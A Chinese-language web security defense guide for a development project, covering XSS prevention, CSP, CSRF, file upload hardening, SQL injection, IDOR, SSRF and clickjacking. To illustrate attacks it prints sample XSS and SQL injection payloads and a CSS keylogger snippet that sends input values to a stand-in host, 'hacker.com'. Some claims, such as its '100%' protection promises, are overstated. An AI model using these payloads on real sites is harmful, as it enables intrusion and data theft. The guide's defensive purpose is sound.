> 本文档为 `ガチ恋` 根据自身经验及 AI 帮助总结得来，需要应用至此项目的开发中

# Web 安全防御指南

## 1. XSS 防范

根治 XSS 的根本在于**不让黑客把恶意代码注入进来**。

### 1.1 止损措施

只能在出现漏洞后减小损失，甚至在出现漏洞后能防范生产中的所有 XSS 问题，但是没办法确保 100% 可靠。

有时“根治措施”也会出现问题，所以配置止损措施是必要的！！！并且有时根治和止损措施相结合才能达成 100% 可靠性。

#### 1.1.1 HTTP 安全头

- **Content-Security-Policy (CSP)**
  - **作用**：告诉浏览器只允许加载哪些域名的脚本，禁止内联脚本（Inline Script）和 `eval()`。
  - **配置建议**：
    ```http
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';
    ```
  - **关键点**：禁止 `unsafe-inline` 和 `unsafe-eval`。

  - **注意**

- **Set-Cookie: HttpOnly**
  - **作用**：禁止 JavaScript 读取 Cookie。
  - **效果**：即使攻击者成功注入了 XSS 脚本，也无法通过 `document.cookie` 窃取用户的 Session ID，防止了会话劫持。
  - **配置**：在设置 Cookie 时加上 `HttpOnly; Secure; SameSite=Strict`。

- **X-Content-Type-Options: nosniff**
  - **作用**：禁止浏览器猜测文件类型。防止攻击者上传一个名为 `.jpg` 但内容是 HTML/JS 的文件被浏览器执行。

#### 1.1.2 后端输入验证

虽然输入验证不能完全防止 XSS，因为某些合法输入也可能包含特殊字符。

- **白名单机制**：参数值不匹配直接拒绝请求（如 gender 只能是 male/female）。
- **长度限制**：限制输入长度可以增加攻击者构造 Payload 的难度。
- **禁止敏感输入**：

注意！后端不要做输入转译再存入数据库，因为这会导致 ios、android 等平台等用户内容出现乱码，转码应该始终在客户端进行。

### 1.2 根治措施

如果想根治 XSS，应该综合以下措施：

#### 1.2.1 后端禁止敏感输入

如检测到 `<script>` 则拒绝评论请求，但这会导致博客类网站无法正常使用，或评论区无法显示 `<script>`导致失去部分用户体验。

#### 1.2.2. 上下文感知的输出编码 (Context-Aware Output Encoding)

如果你是服务端渲染（SSR，如 JSP, PHP, Thymeleaf, Next.js SSR），必须在输出数据到 HTML 前进行转义。

- **原则**：根据数据所在的位置（HTML 标签内、属性内、JS 变量内、CSS 内），采用不同的编码规则。
- **HTML 实体编码**：
  - 将 `<` 转义为 `&lt;`
  - 将 `>` 转义为 `&gt;`
  - 将 `&` 转义为 `&amp;`
  - 将 `"` 转义为 `&quot;`
  - 将 `'` 转义为 `&#x27;`
- **Java 示例 (OWASP Java Encoder)**:
  ```java
  // 放在 HTML body 中
  Encode.forHtml(userData);
  // 放在 input 的 value 属性中
  Encode.forHtmlAttribute(userData);
  // 放在 JavaScript 变量中
  Encode.forJavaScript(userData);
  ```

#### 1.2.3 特殊场景：富文本防范 (Rich Text)

注意！！！此方式必须配合 CSP、防御性编程（不使用全局变量等）、严格的 DOMPurify 检查配置才能实现 100% 的防范效果。

这是 XSS 防范中最难的地方。比如博客、邮件系统，用户**必须**输入 HTML（加粗、图片、链接）。

**方案：HTML 净化 (Sanitization)**

既然不能全盘转义（否则 `<br>` 变成了 `&lt;br&gt;` 没法换行了），那就必须**清洗**数据。

1.  **使用成熟的库**：千万不要自己写正则过滤！你写不过黑客的。
2.  **推荐库**：**DOMPurify** (目前业界标准)。

**前端使用示例 (DOMPurify)**:

```javascript
import DOMPurify from 'dompurify';

// 假设 dirty 是用户输入的包含恶意脚本的 HTML
const dirty = '<img src=x onerror=alert(1)><b>Hello</b>';

// 清洗
const clean = DOMPurify.sanitize(dirty);

// clean 的结果是: <img src="x"><b>Hello</b> (onerror 被干掉了)
// 然后再安全地插入 DOM
document.getElementById('content').innerHTML = clean;
```

#### 1.2.4 前端防范方案（执行环境）

现代前端开发中，前端主要负责渲染，是防止 DOM 型 XSS 的主战场。

#### 1.2.4.1 使用现代框架转译 html 和 unsafe-inline css

总结为：永远不要把用户输入当作 html 来显示！

这些框架在默认情况下会自动对数据进行 HTML 和 unsafe-line css 转义，能防范 90% 的 XSS。

- **React**: `{userContent}` 会自动转义。
- **Vue**: `{{ userContent }}` 会自动转义。

**⚠️ 高危操作警告**：
所有框架都留了“后门”用于渲染原生 HTML，**除非万不得已，绝对禁止使用**：

- **React**: `dangerouslySetInnerHTML`
- **Vue**: `v-html`

#### 1.2.4.2. DOM 操作安全 (避免 DOM-based XSS)

总结为：永远不要把用户输入当作 html 来显示！

如果你使用原生 JS 或 jQuery，必须小心操作 DOM。

- **禁止使用**：`innerHTML`, `outerHTML`
- **推荐使用**：`innerText`, `textContent`

  ```javascript
  // ❌ 不安全：攻击者输入 <img src=x onerror=alert(1)> 会被执行
  div.innerHTML = userInput;

  // ✅ 安全：攻击者输入的内容会被当做纯文本显示
  div.textContent = userInput;
  ```

#### 1.2.4.3. JavaScript 安全

总结为：永远不要把用户输入当作 JS 来执行！

1. 永远不要把用户输入的数据放入以下函数中：

- `eval()`
- `setTimeout('user_input_string', 1000)` (使用回调函数代替字符串)
- `setInterval('user_input_string', 1000)`
- `new Function(user_input)`

2. 永远不要把用户输入的数据放入内联事件监听器！

3. URL 参数处理

   如果页面逻辑依赖 URL 参数（如 `location.search` 或 `location.hash`）来渲染内容，必须先解码再转义。
   - 检查 `javascript:` 伪协议。例如 `<a href="${userInput}">`，如果用户输入 `javascript:alert(1)`，点击即中招。
   - **方案**：只允许 `http` 和 `https` 开头的链接。

#### 1.2.4.4 CSS 安全

总结为：永远不要把用户输入当作 CSS 来应用！

### 1.3 CSP 为什么需要为 style 设置 unsafe-inline？CSS 注入会有什么问题？

#### 1.3.1. 为什么 style 需要 unsafe-inline？

理想状态下，CSP 应该禁止所有内联（Inline），即 `<script>...</script>` 和 `<style>...</style>` 或 `style="..."` 都不允许，只允许加载外部 `.js` 和 `.css` 文件。

但在现实前端开发中，禁止内联样式非常困难：

- **JS 修改样式**：jQuery 的 `$(elem).show()` 或原生 `elem.style.display = 'block'` 本质上是在元素上添加 `style` 属性，这属于内联样式。
- **CSS-in-JS 库**：像 `styled-components` 或 `Emotion` 这类 React 库，很多会在运行时动态生成 `<style>` 标签插入 Head。
- **老旧代码**：历史遗留的 HTML 中充满了 `style="color: red"`。

为了不把页面搞崩，开发者往往被迫开启 `style-src 'unsafe-inline'`。

#### 1.3.2. 如何在允许内联样式的情况下防御？

开启 `unsafe-inline` 确实削弱了安全性，但我们可以通过 **Nonce（随机数）** 机制来补救。

- **Nonce 方案（推荐）**：
  1.  后端在每次请求时生成一个随机字符串（Nonce），如 `abc123xyz`。
  2.  后端设置 CSP 头：`Content-Security-Policy: style-src 'self' 'nonce-abc123xyz';`
  3.  前端在写内联样式时带上这个 ID：`<style nonce="abc123xyz">...</style>`。
  4.  **效果**：只有带正确 Nonce 的样式块会被执行。黑客注入的 `<style>body{...}</style>` 因为没有这个随机 Nonce，会被浏览器拦截。

_注意：对于 `style="..."` 属性（attribute），Nonce 无法直接保护。现在的 CSP Level 3 提供了 `'unsafe-hashes'` 等更细粒度的控制，但实施成本较高。通常对于 style 属性的注入，主要依靠前端框架自身的转义机制。_

#### 1.3.3. CSS 注入 (CSS Injection) 会出现什么问题？

千万不要觉得“CSS 只是改改颜色，不能执行 JS，所以没关系”。CSS 注入是非常危险的：

- **风险 A：数据窃取 (CSS Keylogger)**
  利用 CSS 选择器和背景请求，可以偷取页面上的敏感数据（如 CSRF Token 或密码）。
  - **原理**：
    ```css
    /* 尝试猜测 input 的 value 是否以 'a' 开头 */
    input[value^='a'] {
      background-image: url('http://hacker.com/log?key=a');
    }
    input[value^='b'] {
      background-image: url('http://hacker.com/log?key=b');
    }
    ```
  - 如果页面上有 `<input value="abc">`，浏览器匹配到第一条规则，就会向黑客服务器发送请求。黑客可以不断细化选择器（`value^="ab"`, `value^="ac"`）来逐字猜出完整内容。

- **风险 B：钓鱼攻击 (UI Redressing)**
  - 黑客可以注入样式，将一个透明的 `div` 覆盖在正常的“登录”按钮上，或者把页面伪装成由于系统错误需要重新登录的样子，诱导用户输入密码。

- **风险 C：内容篡改**
  - 通过 `content` 属性改变页面显示的文本，造成虚假信息传播。
  - `body { display: none; }` 造成拒绝服务（页面白屏）。

**总结**：CSS 注入虽然通常不能直接执行 JS，但能窃取数据和破坏 UI。**如果无法完全禁止 `unsafe-inline`，请务必使用 `Nonce` 策略来限制 `<style>` 标签的执行。**

### 1.4 文件上传的 XSS 攻击

#### 1. 核心架构层：彻底的域隔离 (The Silver Bullet)

这是最有效、最彻底的防御手段。

- **策略**：将用户上传的文件存储并投放在一个**完全独立的域名**（或子域名）上。
  - 主站：`www.example.com`
  - 文件站：`static-assets.com` 或 `files.example-user-content.com`
- **原理**：利用浏览器的**同源策略 (Same-Origin Policy)**。即使攻击者成功上传了一个含有恶意脚本的 HTML 文件，当受害者访问该文件时，脚本是在 `static-assets.com` 的域下执行的。
- **结果**：攻击者无法读取主站 `www.example.com` 的 Cookie、LocalStorage，也无法对主站发起 CSRF 攻击。
- **注意**：不要仅仅使用子域名（如 `upload.example.com`），因为某些 Cookie 可以设置在父域上。最好使用完全不同的顶级域名（这也是为什么 GitHub 使用 `githubusercontent.com`，Google 使用 `googleusercontent.com` 的原因）。

#### 2. HTTP 协议层：强制浏览器行为

如果不具备独立域名的条件，或者作为第二道防线，必须通过 HTTP 响应头强制浏览器“不要执行”文件内容。

- **强制下载 (Content-Disposition)**：
  对于非图片类文件（如 PDF、HTML、DOCX 等），强制浏览器下载而不是在浏览器内直接打开。
  ```http
  Content-Disposition: attachment; filename="upload.pdf"
  ```
- **禁止 MIME 嗅探 (X-Content-Type-Options)**：
  防止浏览器“自作聪明”。比如你声明这是 `text/plain`，但浏览器发现里面有 HTML 标签，IE/Chrome 早期版本可能会把它当 HTML 执行。
  ```http
  X-Content-Type-Options: nosniff
  ```
- **内容安全策略 (CSP)**：
  在提供文件的 URL 响应中设置极严的 CSP，禁止脚本执行。
  ```http
  Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox
  ```
  _`sandbox` 属性可以禁止表单提交、脚本执行和弹出窗口。_

#### 3. 文件处理层：清洗与重写 (Rendering)

不要原样保存用户上传的文件，而是对其进行“重塑”。

- **图片重渲染 (Image Resizing/Re-encoding)**：
  不要直接保存用户上传的 `original.jpg`。使用 ImageMagick（需注意修补 ImageMagick 自身的漏洞）或 GD 库，将图片加载到内存，重新调整大小或改变压缩率，然后生成一个新的文件。
  - **原理**：这会破坏隐藏在图片 Exif 数据或文件尾部的恶意代码（图片马）。
- **SVG 的特殊处理**：
  SVG 本质是 XML，极易包含 `<script>`。
  - **方案 A（推荐）**：将 SVG 转换为 PNG/JPG 后存储。
  - **方案 B**：如果必须保留矢量图，使用严格的 XML 解析库（如 DOMPurify）进行白名单清洗，剔除所有非图形标签。
- **文件名随机化**：
  永远不要使用用户上传的文件名（如 `evil.php`）。
  - **做法**：生成 UUID 作为文件名（如 `f47ac10b-58cc...png`），并将原始文件名存入数据库映射。这防止了路径猜测和特定扩展名攻击。

#### 4. 验证层：严格的白名单

- **扩展名白名单**：
  只允许业务必须的格式（如 `['jpg', 'png', 'jpeg', 'gif']`）。**绝对不要使用黑名单**（黑名单永远会被 `file.php5`, `file.shtml`, `file.php.jpg` 等绕过）。
- **MIME-Type 检查**：
  检查 HTTP Header 中的 `Content-Type`，但这很容易伪造，只能作为辅助。
- **文件头（Magic Number）检查**：
  读取文件的前几个字节，确定真实格式。例如 JPEG 总是以 `FF D8 FF` 开头。
  _注意：这不能防范“多语言文件（Polyglot）”攻击（即一个文件既是合法的 GIF 又是合法的 JS），所以必须结合第3点的“重渲染”使用。_

#### 5. 存储层：权限控制

- **禁止执行权限**：
  如果文件存储在本地服务器（而非对象存储 S3/OSS），确保存储目录在 Web 服务器配置（Nginx/Apache）中**禁止脚本执行**。
  - **Nginx 示例**：
    ```nginx
    location /uploads/ {
        location ~ \.(php|php5|html)$ {
            deny all;
        }
    }
    ```
  - **文件系统权限**：Linux 下设置文件权限为 `644`（所有者读写，其他人只读），目录不给 `x`（执行）权限。

---

#### 总结：终极防御流程图

如果要把防御做到极致，处理一个文件上传请求的流程应该是这样的：

1.  **网关层**：WAF 拦截已知的恶意 Payload。
2.  **应用层**：
    - 验证扩展名（白名单）。
    - 验证文件头（Magic Number）。
    - 生成随机文件名（UUID）。
3.  **处理层**：
    - 如果是图片 -> **重绘/压缩**（清除隐写代码）。
    - 如果是 SVG -> **转栅格化**或**强力 Sanitizer**。
    - 如果是其他文件 -> 保持原样但标记为“附件”。
4.  **存储层**：上传到 **S3 / OSS**（天然无执行权限）。
5.  **分发层**：
    - 使用**独立域名** (static-assets.com)。
    - 响应头强制：`X-Content-Type-Options: nosniff`。
    - 响应头强制：`Content-Security-Policy: default-src 'none'`.
    - 非媒体文件强制：`Content-Disposition: attachment`.

### 1.5 100% 防范 Checklist (总结)

如果你的项目同时满足以下所有条件，可以说达到了 **100% 工业级防范标准**：

1.  **HttpOnly Cookies**：开启。
2.  **CSP 策略**：开启并配置严格（禁止 unsafe-inline）。
3.  **框架层**：使用 React/Vue，并禁止使用 `v-html` / `dangerouslySetInnerHTML`。
4.  **富文本**：如果必须用，必须经过 **DOMPurify** 清洗（建议入库前清洗一次，出库渲染前再清洗一次的双重保险）。
5.  **链接跳转**：对于用户提交的 URL，强制检查协议，禁止 `javascript:` 开头。
6.  **后端输出**：对于非 API 的直接 HTML 输出，全量进行实体转义。
7.  **文件上传**：限制上传后缀，强校验文件头，且文件服务器配置 `X-Content-Type-Options: nosniff`等。

## 2. CSP (内容安全策略) 配置详解

CSP 是浏览器的**白名单机制**，通过 HTTP 响应头控制资源加载。

### 2.1 基础配置

在 Nginx 或后端代码中添加 Header：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; img-src 'self' data:;
```

- **`default-src 'self'`**: 默认只允许同源资源。
- **`script-src 'self' ...`**: **关键！** 不要加 `'unsafe-inline'`，这能禁用页面内的 `<script>...</script>` 块，防止 XSS 执行。
- **`img-src ...`**: 控制图片加载源。

### 2.2 常见问题：图片跨域显示

**问题**：我的网站是 `mysite.com`，图片存在 `my-bucket.oss.com`，CSP 设置了 `img-src 'self'`，图片挂了。
**原因**：`'self'` 只匹配当前域名，CDN 域名被拦截。
**解决**：将 CDN 域名加入白名单。

```http
Content-Security-Policy: default-src 'self'; img-src 'self' https://my-bucket.oss.com;
```

## 3. 只要配置好 CSP 并使用 innerText，就能完全由前端防范 XSS 吗？

不行，必须有后端转译并禁止危险输入才能 100% 防范。因为：

1. 完全依赖 CSP 是不推荐的。因为：
   CSP 可能会因为某些兼容性需求被放宽。
   旧版本浏览器可能不支持完善的 CSP 拦截。

2. 你配置了 CSP，但为了业务，你可能不得不允许一些公共 CDN（如 script-src https://cdnjs.cloudflare.com）。黑客通过 cdn 库的漏洞攻击。

3. “注入初始状态“漏洞（常出现在 SSR 框架中）

后端把用户数据直接拼接到 HTML 的 `<script>` 标签里，作为全局变量给前端用。

```html
<script>
  // ❌ 如果 user.bio 包含 "</script><script>alert(1)</script>"
  window.__INITIAL_STATE__ = {
      bio: "<%= user.bio %>"
  };
</script>
```

在将数据注入到 HTML `<script>` 标签时，必须对数据进行 JSON 序列化并转义。

---

## 4. CSRF (跨站请求伪造) 防御方案

CSRF 利用的是**浏览器在发送请求时会自动携带 Cookie** 的特性。因此根治 CSRF 的措施是**禁止自动向不安全的站点提供登录凭证**！

### 防御方案 A：SameSite Cookie（首选）

在后端设置 Cookie 时添加 `SameSite` 属性。

```http
Set-Cookie: session_id=xyz; SameSite=Lax; Secure;
```

- **Lax**: 允许正常导航携带 Cookie，但禁止跨站表单提交或 AJAX 携带 Cookie。这是现代浏览器的默认行为，能阻断绝大多数 CSRF。

### 防御方案 B：CSRF Token（后端强制校验）

1.  用户登录后，服务器生成一个随机 Token（不存 Cookie，存在 Session 或通过页面渲染下发）。
2.  前端发请求时，必须在 Header 或 Body 中带上这个 Token。
3.  **攻击者无法获取这个 Token**，因此伪造的请求会被服务器拒绝。

### 防御方案 C：将 token 放在 localstorage 而非 cookie 中

但是发生 XSS 时 token 将会被窃取，需要严密防范 XSS。

---

## 5. 其他 Web 漏洞

有些漏洞前端完全无能为力，必须在服务端解决。

### 5.1 SQL 注入 (SQL Injection)

- **原理**：恶意输入修改 SQL 语句结构。
  - 输入：`' OR 1=1 --`
  - 拼接后：`SELECT * FROM users WHERE user = '' OR 1=1 --'`
- **防御**：**预编译语句 (Prepared Statements)**。永远不要拼接 SQL 字符串。

### 5.2 越权访问 (IDOR / Broken Access Control)

- **原理**：攻击者修改 API 参数中的 ID。
  - 请求 `GET /order/detail?id=101` （原本只能看 id=100 的订单）。
- **防御**：后端在处理**每一个**请求时，必须校验：**“当前登录用户的 ID 是否有权限访问目标数据 ID？”**

### 5.3 SSRF (服务端请求伪造)

- **原理**：诱导服务器去请求内网地址。
  - 输入：`http://localhost:3306` 让你的 Web 服务器去连内网数据库。
- **防御**：请求目标白名单化，禁止请求内网 IP 段。

### 5.4 点击劫持 (Clickjacking)

- **原理**：用透明 iframe 覆盖在按钮上诱导点击。
- **防御**：配置 HTTP Header `X-Frame-Options: DENY` 或 `SAMEORIGIN`。

---

## 6. 总结对比表

| 漏洞名称        | 发生位置        | 核心原因                | 最佳防御手段                                                     |
| :-------------- | :-------------- | :---------------------- | :--------------------------------------------------------------- |
| **XSS**         | 前端 (浏览器)   | 盲目渲染用户输入为 HTML | 1. 上下文感知编码 / `textContent`<br>2. CSP (禁止 inline script) |
| **CSRF**        | 后端 (接收端)   | 浏览器自动携带 Cookie   | 1. Cookie `SameSite=Lax`<br>2. CSRF Token                        |
| **SQL 注入**    | 后端 (数据库)   | 拼接 SQL 字符串         | 使用预编译语句 (Prepared Statement)                              |
| **越权 (IDOR)** | 后端 (业务逻辑) | 未校验数据归属权        | 接口层面的权限逻辑校验 (A用户只能动A的数据)                      |
| **点击劫持**    | 前端 (视觉)     | 页面被嵌入 iframe       | `X-Frame-Options: DENY`                                          |
